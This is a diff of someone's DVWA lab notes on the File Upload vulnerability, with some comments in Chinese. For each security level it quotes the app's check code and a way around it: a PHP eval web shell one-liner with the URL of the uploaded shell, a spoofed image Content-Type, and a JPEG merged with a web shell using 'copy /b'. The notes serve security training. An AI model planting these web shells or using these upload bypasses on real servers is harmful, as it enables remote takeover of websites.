@@ -78,9 +78,19 @@ File Inclusion
 	if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {}
 	
 File Upload
-	<?php @eval($_POST["password"]);?>
-	http://1.117.162.201/dvwa/hackable/uploads/1.php
-
+	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { }
+		<?php @eval($_POST["password"]);?>
+			http://1.117.162.201/dvwa/hackable/uploads/1.php
+	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&( $uploaded_size < 100000 ) ) { }
+		Content-Disposition: form-data; name="uploaded"; filename="2.php" //后缀改后文件名也会改
+		Content-Type: application/octet-stream  -> image/jpeg
+	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
+	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&( $uploaded_size < 100000 ) &&getimagesize( $uploaded_tmp ) ) { }
+		1.jpg/b+1.php/a webshell.jpg  （参数“/b”表示以二进制格式复制、合并文件，参数“/a”表示以ASCII格式复制、合并文件）//未成  要先phpinfo试一试效果...
+		
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
+	
 Insecure CAPTCHA
 
 SQL Injection
